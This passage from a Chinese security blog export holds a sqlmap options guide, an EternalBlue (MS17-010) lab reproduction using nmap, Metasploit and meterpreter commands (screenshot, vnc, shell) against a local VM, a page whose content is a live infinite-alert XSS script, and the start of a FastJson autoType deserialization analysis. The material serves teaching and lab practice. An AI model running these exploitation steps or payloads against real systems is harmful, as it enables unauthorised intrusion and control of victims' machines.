–parse-error</p><p>保存Sqlmap配置文件 –save 可以将命令行选项保存到配置INI文件中。然后，可以使用之前解释的-c选项编辑生成的文件并将其传递给sqlmap。</p><p>更新Sqlmap –update</p><h3 id="14-7-强制设置-DBMS-编码"><a href="#14-7-强制设置-DBMS-编码" class="headerlink" title="14.7 强制设置 DBMS 编码"></a>14.7 强制设置 DBMS 编码</h3><p>–encoding&#x3D;”gbk” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025767.png" alt="img"></p><h3 id="14-8-存储-HTTP-流量到-HAR"><a href="#14-8-存储-HTTP-流量到-HAR" class="headerlink" title="14.8 存储 HTTP 流量到 HAR"></a>14.8 存储 HTTP 流量到 HAR</h3><p>–har&#x3D;”HARFILE” HAR（HTTP Archive），是一个用来储存HTTP请求&#x2F;响应信息的通用文件格式，基于JSON。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020937.png" alt="img"></p><h3 id="14-9-筛选具体-Payload"><a href="#14-9-筛选具体-Payload" class="headerlink" title="14.9 筛选具体 Payload"></a>14.9 筛选具体 Payload</h3><p>–test-filter&#x3D;”ROW” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025817.png" alt="img"></p><h3 id="14-10-过滤具体-Payload"><a href="#14-10-过滤具体-Payload" class="headerlink" title="14.10 过滤具体 Payload"></a>14.10 过滤具体 Payload</h3><p>–test-skip&#x3D;”BENCHMARK” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020843.png" alt="img"></p><p> <strong>补充：</strong> 针对proxy日志文件使用正则表达式筛选目标 –scope&#x3D;”regex”</p><h2 id="0x0F-sqlmap-杂项参数"><a href="#0x0F-sqlmap-杂项参数" class="headerlink" title="0x0F sqlmap 杂项参数"></a>0x0F sqlmap 杂项参数</h2><h3 id="15-1-使用缩写助记符"><a href="#15-1-使用缩写助记符" class="headerlink" title="15.1 使用缩写助记符"></a>15.1 使用缩写助记符</h3><p>Sqlmap提供灵活的缩写助记符来进行快速书写命令。 -z 参数</p><p>例如： python sqlmap.py –batch –random-agent –ignore-proxy –technique&#x3D;BEU -u<a href="http://www.target.com/vuln.php?id=1%E2%80%B3">www.target.com/vuln.php?id=1″</a></p><p>使用助记符： python sqlmap.py -z “bat,randoma,ign,tec&#x3D;BEU” -u “<a href="http://www.target.com/vuln.php?id=1%E2%80%9D">www.target.com/vuln.php?id=1”</a></p><h3 id="15-2-设置探测预警"><a href="#15-2-设置探测预警" class="headerlink" title="15.2 设置探测预警"></a>15.2 设置探测预警</h3><p>在发现SQL注入漏洞时，运行本机主机系统命令 –alert </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020505.png" alt="img"></p><h3 id="15-3-设置问题答案"><a href="#15-3-设置问题答案" class="headerlink" title="15.3 设置问题答案"></a>15.3 设置问题答案</h3><p>如果用户想自动设置问题的答案，即使使用–batch，使用–answers，通过在等号后面提供问题的任何部分和答案来完成。另外，不同问题的答案可以用分隔符分隔。</p><p>例如： python sqlmap.py -u “<a href="http://192.168.22.128/sqlmap/mysql/get_int.php?id=1%E2%80%9D%E2%80%93technique=E">http://192.168.22.128/sqlmap/mysql/get_int.php?id=1”–technique=E</a> –answers&#x3D;“extending&#x3D;N” –batch</p><h3 id="15-4-发现-SQL-注入预警"><a href="#15-4-发现-SQL-注入预警" class="headerlink" title="15.4 发现 SQL 注入预警"></a>15.4 发现 SQL 注入预警</h3><p>如果用户使用–beep，当发现SQL注入时，会立即发出哔哔的警告。这在需要测试的大量目标url(选项-m)时特别有用。</p><h3 id="15-5-其他"><a href="#15-5-其他" class="headerlink" title="15.5 其他"></a>15.5 其他</h3><p>–cleanup 清除DBMS udf创建的数据表 –dependencies 查看依赖项 –disable-coloring 不进行高亮显示 –identify-waf 查看是否具有WAF保护 –moblie 使用手机端User-Agent –purge-output 清除output目录下的文件 –skip-waf 绕过WAF –sqlmap-shell 使用sqlmap shell –tmp-dir&#x3D;TMPDIR 指定本地目录用来存储临时文件 –web-root&#x3D;WEBROOT 指定站点根目录 –wizard 使用向导式的sqlmap –gpage&#x3D;GOOGLEPAGE 设置Google Dork的页码数</p><p>–smart 智能探测 有些情况下，用户有大量的潜在目标URL（例如，提供了选项 -m），希望尽快找到一个脆弱的目标。如果使用—smart，那么将在扫描中进一步使用数据库管理系统错误的参数，否则就跳过它们</p><h2 id="0x10-常用-Tamper-脚本"><a href="#0x10-常用-Tamper-脚本" class="headerlink" title="0x10 常用 Tamper 脚本"></a>0x10 常用 Tamper 脚本</h2><p>这里推荐几篇比较详细的文章去学习： <a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.cnblogs.com/mark0/p/12349551.html&objectId=2148285&objectType=1&contentType=undefined">https://www.cnblogs.com/mark0/p/12349551.html</a></p><p><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://blog.csdn.net/qq_34444097/article/details/82717357?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=159341834119725219951313&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3&utm_term=sqlmap%20tamper%E8%84%9A%E6%9C%AC&objectId=2148285&objectType=1&contentType=undefined">https://blog.csdn.net/qq_34444097&#x2F;article&#x2F;details&#x2F;82717357?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334…%2522%257D&amp;request_id&#x3D;159341834119725219951313&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2allfirst_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3&amp;utm_term&#x3D;sqlmap+tamper脚本</a></p><blockquote><p> 版权声明：本文内容由互联网用户自发贡献，该文观点仅代表作者本人。本站仅提供信息存储空间服务，不拥有所有权，不承担相关法律责任。如发现本站有涉嫌侵权&#x2F;违法违规的内容， 请发送邮件至 举报，一经查实，本站将立刻删除。 </p><p>发布者：全栈程序员栈长，转载请注明出处：<a href="https://javaforall.cn/200744.html%E5%8E%9F%E6%96%87%E9%93%BE%E6%8E%A5%EF%BC%9Ahttps://javaforall.cn">https://javaforall.cn/200744.html原文链接：https://javaforall.cn</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>sqlmap命令详解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>永恒之蓝 复现</title>
    <link href="/2025/11/01/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/11/01/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h1><p>永恒之蓝（英语：EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄漏。该工具利用445&#x2F;TCP端口的文件分享协议的漏洞进行散播。</p><p>尽管微软于2017年3月14日已发布补丁修复该漏洞，但在5月12日WannaCry勒索软件利用此漏洞传播时，大量未安装补丁的用户仍然受害。</p><p>鉴于WannaCry的严重性，微软罕见地为已终止支持的Windows XP、Windows 8和Windows Server 2003发布了紧急安全更新。</p><p>2017年6月27日，勒索软件NotPetya再次利用永恒之蓝漏洞在欧洲传播。与普通勒索软件不同，NotPetya以破坏而非勒索为目的，即使支付赎金也无法恢复文件。真正的Petya作者随后公布了解密密钥，并声明与此次攻击无关。</p><h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p><strong><font style="color:rgb(15, 17, 21);">永恒之蓝利用的是Windows系统文件共享功能中一个严重的远程代码执行漏洞。攻击者无需用户名和密码，只要目标机器的445端口是开放的，就可以通过网络直接发送一段精心构造的数据包，在目标系统上执行任意代码。</font></strong></p><h2 id="核心漏洞：SMBv1-协议中的“缓冲区溢出”"><a href="#核心漏洞：SMBv1-协议中的“缓冲区溢出”" class="headerlink" title="核心漏洞：SMBv1 协议中的“缓冲区溢出”"></a><font style="color:rgb(15, 17, 21);">核心漏洞：SMBv1 协议中的“缓冲区溢出”</font></h2><p><font style="color:rgb(15, 17, 21);">永恒之蓝攻击的是Windows的</font><strong><font style="color:rgb(15, 17, 21);">SMBv1</font></strong><font style="color:rgb(15, 17, 21);"> 服务器消息块协议。这个协议主要用于网络上的文件共享、打印机共享等。漏洞的核心是一个经典的 </font><strong><font style="color:rgb(15, 17, 21);">缓冲区溢出</font></strong><font style="color:rgb(15, 17, 21);"> 漏洞。</font></p><ol><li><strong><font style="color:rgb(15, 17, 21);">什么是缓冲区？</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">我们可以把缓冲区想象成一个有固定容量的“容器”或“货架”，用来临时存放程序处理的数据。</font></li><li><strong><font style="color:rgb(15, 17, 21);">溢出是如何发生的？</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">在SMBv1协议处理特定的SMB请求（尤其是与文件事务相关的</font><code>SMBv1 TRANS2</code><font style="color:rgb(15, 17, 21);">请求）时，程序没有正确地检查用户输入数据的长度。</font><ul><li><font style="color:rgb(15, 17, 21);">攻击者构造一个</font><strong><font style="color:rgb(15, 17, 21);">超长</font></strong><font style="color:rgb(15, 17, 21);">的、</font><strong><font style="color:rgb(15, 17, 21);">畸形</font></strong><font style="color:rgb(15, 17, 21);">的数据包。</font></li><li>当Windows系统收到这个数据包时，会按照SMB协议去解析它。</li><li><font style="color:rgb(15, 17, 21);">由于没有进行长度校验，这个超长的数据会“撑爆”系统预先分配好的那个“缓冲区”，导致多出来的数据覆盖到旁边内存区域。</font></li></ul></li></ol><h2 id="关键步骤：从溢出到控制"><a href="#关键步骤：从溢出到控制" class="headerlink" title="关键步骤：从溢出到控制"></a><font style="color:rgb(15, 17, 21);">关键步骤：从溢出到控制</font></h2><p><font style="color:rgb(15, 17, 21);">仅仅让程序崩溃（造成蓝屏）不是攻击者的目的，他们的目标是</font><strong><font style="color:rgb(15, 17, 21);">控制</font></strong><font style="color:rgb(15, 17, 21);">你的电脑。永恒之蓝通过以下精妙的步骤实现了这一点：</font></p><ol><li><strong><font style="color:rgb(15, 17, 21);">覆盖关键数据，劫持程序流程：</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">被“撑爆”的缓冲区旁边的内存区域，存放着一些关键数据，比如</font><strong><font style="color:rgb(15, 17, 21);">函数返回地址</font></strong><font style="color:rgb(15, 17, 21);">。攻击者精心设计溢出数据，用他们指定的一个内存地址去覆盖这个返回地址。</font></li><li><strong><font style="color:rgb(15, 17, 21);">利用“Shellcode”执行命令：</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">在溢出的数据中，攻击者会嵌入一小段恶意代码，称为</font><font style="color:rgb(15, 17, 21);"> </font><strong><font style="color:rgb(15, 17, 21);">“Shellcode”</font></strong><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">。这段代码的功能通常是：</font><strong><font style="color:rgb(15, 17, 21);">下载并执行勒索软件（如WannaCry）的后端负载，或者在系统上开一个具有高权限的后门</font></strong><font style="color:rgb(15, 17, 21);">。</font></li><li><strong><font style="color:rgb(15, 17, 21);">触发漏洞，跳转到攻击代码：</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">当被攻击的程序（SMB服务）处理完这个畸形数据包，准备返回时，它会去读取那个被覆盖的“返回地址”。这个地址现在指向的是攻击者安排的位置。</font></li><li><strong><font style="color:rgb(15, 17, 21);">内核态权限提升：</font></strong><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">这里是最精妙也最危险的一步。永恒之蓝利用了一个名为</font><font style="color:rgb(15, 17, 21);"> </font><strong><font style="color:rgb(15, 17, 21);">“DoublePulsar”</font></strong><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">的后门。在溢出发生后，Shellcode并不会直接在用户权限下运行，而是利用Windows内核中的一个机制，将执行流程切换到</font><strong><font style="color:rgb(15, 17, 21);">内核模式</font></strong><font style="color:rgb(15, 17, 21);">。</font><ul><li><strong><font style="color:rgb(15, 17, 21);">用户模式</font></strong><font style="color:rgb(15, 17, 21);">：普通程序的运行级别，权限受限。</font></li><li><strong><font style="color:rgb(15, 17, 21);">内核模式</font></strong><font style="color:rgb(15, 17, 21);">：操作系统的核心运行级别，拥有对系统的完全控制权。</font><font style="color:rgb(15, 17, 21);"><br></font><font style="color:rgb(15, 17, 21);">通过一个精心构造的“任意写入”原语，攻击者可以将自己的Shellcode注入到内核空间，并提升其权限，使其以</font><strong><font style="color:rgb(15, 17, 21);">系统最高权限</font></strong><font style="color:rgb(15, 17, 21);">执行。</font></li></ul></li></ol><h2 id="攻击流程总结"><a href="#攻击流程总结" class="headerlink" title="攻击流程总结"></a><font style="color:rgb(15, 17, 21);">攻击流程总结</font></h2><p><font style="color:rgb(15, 17, 21);">一个完整的永恒之蓝攻击可以概括为以下几步：</font></p><ol><li><strong><font style="color:rgb(15, 17, 21);">扫描</font></strong><font style="color:rgb(15, 17, 21);">：攻击者在网络上扫描开放了</font><strong><font style="color:rgb(15, 17, 21);">445端口</font></strong><font style="color:rgb(15, 17, 21);">的Windows机器。</font></li><li><strong><font style="color:rgb(15, 17, 21);">发送恶意包</font></strong><font style="color:rgb(15, 17, 21);">：向目标机器的445端口发送利用SMBv1缓冲区溢出漏洞的精心构造的数据包。</font></li><li><strong><font style="color:rgb(15, 17, 21);">触发溢出</font></strong><font style="color:rgb(15, 17, 21);">：目标系统的SMB服务处理该数据包，发生缓冲区溢出，关键内存地址被覆盖。</font></li><li><strong><font style="color:rgb(15, 17, 21);">内核提权</font></strong><font style="color:rgb(15, 17, 21);">：利用DoublePulsar技术，将恶意Shellcode注入内核并提升至系统权限。</font></li><li><strong><font style="color:rgb(15, 17, 21);">执行载荷</font></strong><font style="color:rgb(15, 17, 21);">：在内核态执行Shellcode，通常会从攻击者控制的服务器下载并运行最终的恶意软件（如WannaCry勒索病毒）。</font></li><li><strong><font style="color:rgb(15, 17, 21);">横向移动</font></strong><font style="color:rgb(15, 17, 21);">：被攻陷的机器会变成一个跳板，继续在内部网络中扫描和攻击其他存在漏洞的机器，形成链式反应，这也是WannaCry能迅速蔓延全球的原因。</font></li></ol><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a><font style="color:rgb(15, 17, 21);">危害</font></h2><ul><li><strong><font style="color:rgb(15, 17, 21);">无需用户交互</font></strong><font style="color:rgb(15, 17, 21);">：用户不需要点击任何链接或打开任何文件，只要电脑开机并联网，就可能被攻击。</font></li><li><strong><font style="color:rgb(15, 17, 21);">高权限</font></strong><font style="color:rgb(15, 17, 21);">：直接获取系统内核权限，可以为所欲为。</font></li><li><strong><font style="color:rgb(15, 17, 21);">蠕虫式传播</font></strong><font style="color:rgb(15, 17, 21);">：结合了漏洞利用和蠕虫特性，可以自我复制和传播。</font></li></ul><h1 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h1><p>Windows Server 2003 ip: 192.168.126.128    关闭防火墙</p><p>Kali ip: 192.168.126.129</p><p>Windows Server 2003</p><p>ip地址： 192.168.126.128</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021743813.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510291637576.png"></p><p>关闭防火墙</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744811.png"></p><p>Kali</p><p>ip a</p><p>192.168.126.129</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744515.png"></p><h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><h2 id="1-使用nmap扫一下该网段主机的存活情况"><a href="#1-使用nmap扫一下该网段主机的存活情况" class="headerlink" title="1.使用nmap扫一下该网段主机的存活情况"></a>1.<font style="color:rgb(77, 77, 77);">使用</font><font style="color:rgb(78, 161, 219) !important;">nmap</font><font style="color:rgb(77, 77, 77);">扫一下该网段主机的存活情况</font></h2><p><code>nmap -sS 192.168.126.0/24</code></p><p>找到 IP为：192.168.126.128 的主机开启</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021751981.png"></p><h2 id="2-扫描该主机端口从1-1000的开放情况"><a href="#2-扫描该主机端口从1-1000的开放情况" class="headerlink" title="2.扫描该主机端口从1-1000的开放情况"></a>2.<font style="color:rgb(77, 77, 77);">扫描该主机端口从1-1000的开放情况</font></h2><p><code>nmap -p 1-1000 192.168.126.128</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744177.png"></p><h2 id="3-扫描该主机的操作系统类型"><a href="#3-扫描该主机的操作系统类型" class="headerlink" title="3.扫描该主机的操作系统类型"></a><font style="color:rgb(77, 77, 77);">3.扫描该主机的操作系统类型</font></h2><p><code>nmap -O 192.168.126.128</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744430.png"></p><h2 id="4-扫描该主机上的漏洞"><a href="#4-扫描该主机上的漏洞" class="headerlink" title="4.扫描该主机上的漏洞"></a>4.<font style="color:rgb(77, 77, 77);">扫描该主机上的漏洞</font></h2><p><code>nmap --script=vuln 192.168.126.128</code></p><p>存在 ms17-010 永恒之蓝</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744647.png"></p><blockquote><p><strong>Metasploit</strong>项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。</p><p>Metasploit项目最为知名的子项目是开源的Metasploit框架，一套针对远程主机进行开发和执行“exploit代码”的工具。其他重要的子项目包括Opcode数据库、shellcode档案、安全研究等内容。</p><p>Metasploit项目知名的功能还包括反取证与规避工具，其中的某些工具已经内置在Metasploit Framework里面。</p><p><code>Metasploit</code><font style="color:rgb(85, 86, 102);">（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。</font></p><p><font style="color:rgb(85, 86, 102);">它本身附带数百个已知软件漏洞，</font><strong><font style="color:rgb(85, 86, 102);">是一款专业级漏洞攻击工具</font></strong></p><p><font style="color:rgb(85, 86, 102);">因为只要掌握MSF的使用方法，每个人都可以使用MSF来攻击那些未打过补丁或者刚刚打过补丁的漏洞。</font></p></blockquote><h2 id="5-进入工具"><a href="#5-进入工具" class="headerlink" title="5.进入工具"></a>5.进入工具</h2><p><code>msfconsole</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744725.png"></p><h2 id="6-搜索相关漏洞"><a href="#6-搜索相关漏洞" class="headerlink" title="6.搜索相关漏洞"></a><font style="color:rgb(77, 77, 77);">6.搜索相关漏洞</font></h2><p><code>search ms17-010</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744694.png"></p><h2 id="7-选择模块"><a href="#7-选择模块" class="headerlink" title="7.选择模块"></a>7.选择模块</h2><p><code>use 10</code> 远程执行代码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744248.png"></p><h2 id="8-显示配置项"><a href="#8-显示配置项" class="headerlink" title="8.显示配置项"></a>8.<font style="color:rgb(77, 77, 77);">显示配置项</font></h2><p><code>show options</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021750849.png" alt="img"></p><h2 id="9-设置一下RHOSTS-靶机的ip地址"><a href="#9-设置一下RHOSTS-靶机的ip地址" class="headerlink" title="9.设置一下RHOSTS(靶机的ip地址)"></a><font style="color:rgb(77, 77, 77);">9.设置一下</font><code>RHOSTS</code><font style="color:rgb(77, 77, 77);">(靶机的ip地址)</font></h2><p><code>set RHOSTS 192.168.126.128</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745740.png"></p><h2 id="10-执行攻击"><a href="#10-执行攻击" class="headerlink" title="10.执行攻击"></a>10.执行攻击</h2><p><code>run 或者 exploit</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745876.png"></p><p>运行成功会出现 meterpreter &gt;</p><blockquote><p>Meterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，<br>对目标系统进行更深入的渗透，如获取屏幕、上传&#x2F;下载文件、创建持久后门等。</p></blockquote><p><code>help</code><font style="color:rgb(77, 77, 77);">命令可以查看可以使用哪些命令</font></p><p><code>screenshot</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745278.png"></p><p>xdg-open &#x2F;root&#x2F;KMSzAlpc.jpeg</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745753.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745455.png"></p><p><code>run vnc</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745593.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745149.png"></p><p><code>shell</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021746089.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021746672.png"></p><h1 id="预防方案"><a href="#预防方案" class="headerlink" title="预防方案"></a><font style="color:rgb(79, 79, 79);">预防方案</font></h1><ul><li><font style="color:rgb(51, 51, 51);">打开防火墙，安装杀毒软件。</font></li><li><font style="color:rgb(51, 51, 51);">关闭445端口及不必要的服务。</font></li><li><font style="color:rgb(51, 51, 51);">安装对应补丁。</font></li></ul><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><a href="https://blog.csdn.net/qq_61839115/article/details/129951295">https://blog.csdn.net/qq_61839115&#x2F;article&#x2F;details&#x2F;129951295</a></p><p><a href="https://blog.csdn.net/m0_65712192/article/details/127637917">https://blog.csdn.net/m0_65712192&#x2F;article&#x2F;details&#x2F;127637917</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss_lab</title>
    <link href="/2025/10/29/xss_lab/"/>
    <url>/2025/10/29/xss_lab/</url>
    
    <content type="html"><![CDATA[<script>while(true){alert(1);}</script>]]></content>
    
    
    <categories>
      
      <category>1</category>
      
    </categories>
    
    
    <tags>
      
      <tag>1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FastJson反序列化</title>
    <link href="/2025/10/21/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/10/21/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="FastJson反序列化"><a href="#FastJson反序列化" class="headerlink" title="FastJson反序列化"></a>FastJson反序列化</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>官方源码： <a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>使用手册： <a href="https://www.w3cschool.cn/fastjson/">https://www.w3cschool.cn/fastjson/</a></p><p>Fastjson是一个Java库，可用于将Java对象转换为它们的JSON表示。它还可以用于将JSON字符串转换为等效的Java对象。Fastjson可以处理任意Java对象，包括没有源代码的预先存在的对象。</p><p> <strong>Java 对象和 JSON 字符串互相转换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">String jsonStr = JSON.toJSONString(obj);        // 对象 → JSON 字符串<br>MyClass obj = JSON.parseObject(jsonStr, MyClass.class); // JSON 字符串 → 对象<br></code></pre></td></tr></table></figure><h3 id="漏洞参考："><a href="#漏洞参考：" class="headerlink" title="漏洞参考："></a>漏洞参考：</h3><p>1.2.24及以下没有对序列化的类做校验,导致漏洞产生<br>1.2.25-1.2.41增加了黑名单限制，更改autoType默认为关闭选项。<br>1.2.42版本是对1.2.41及以下版本的黑名单绕过,代码内更新字符串黑名单hash方式<br>1.2.43版本是对1.2.42及以下版本的黑名单绕过<br>1.2.44-1.2.45版本1.2.43版本黑名单无法绕过,寻找新的利用链进行利用<br>1.2.47版本 利用fastjson处理Class类时的操作,将恶意类加载到缓存中,实现攻击<br>1.2.62-1.2.67版本Class不会再往缓存中加载恶意类,寻找新的利用链进行突破<br>1.2.68版本,使用期望类AutoCloseable来绕过fastjson校验<br>1.2.72-1.2.80使用期望类Throwable的子类,进行绕过</p><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/">https://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/</a></p><p><a href="https://xz.aliyun.com/t/12728">https://xz.aliyun.com/t/12728</a><br><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw">https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw</a></p><p>Fastjson（TemplatesImpl&amp;JdbcRowSetImpl）</p><p><a href="https://mp.weixin.qq.com/s/XPbbgLcBmHE7dmHswY_S3Q">https://mp.weixin.qq.com/s/XPbbgLcBmHE7dmHswY_S3Q</a></p><h2 id="关于-autoType"><a href="#关于-autoType" class="headerlink" title="关于 autoType"></a>关于 autoType</h2><p><strong>AutoType</strong> 是 Fastjson 的一项功能：当 JSON 里出现特殊字段 <code>@type</code> 时，Fastjson 会把这个字符串当作 Java 类型的全限定名（<code>com.example.Foo</code>），尝试把该 JSON 反序列化为对应的 Java 类实例。换句话说，<code>@type</code> 让 JSON 能直接指定要生成哪个 Java 类的对象 —— 这是“多态反序列化”的一种实现方式。</p><p><code>@type</code> 能让不受信任的 JSON 指定任意类去实例化。许多 Fastjson 漏洞就是利用了这点（<code>com.sun.rowset.JdbcRowSetImpl</code> ）</p><p>因此，默认全开 AutoType 会把应用暴露给远程任意对象创建和潜在的代码执行。</p><h2 id="FastJson-1-2-24-反序列化链分析"><a href="#FastJson-1-2-24-反序列化链分析" class="headerlink" title="FastJson 1.2.24 反序列化链分析"></a>FastJson 1.2.24 反序列化链分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fastjson122.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//反序列化基本使用</span><br><br>        <span class="hljs-comment">//1.fastjson 解析变量数据</span><br>        <span class="hljs-comment">//Java 字符串里 &quot; 需要转义</span><br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;theonefx\&quot;,\&quot;age\&quot;:666&#125;&quot;</span>;<br>        <span class="hljs-comment">// JSON.parseObject(String text) 方法，把 JSON 字符串解析成一个 JSONObject 对象，解析后，Fastjson 会自动把字符串里的 JSON 结构转成 Java 对象</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data1</span> <span class="hljs-operator">=</span> JSON.parseObject(str);<br>        <span class="hljs-comment">//直接输出 JSONObject 对象</span><br>        System.out.println(data1);<br><br>        <span 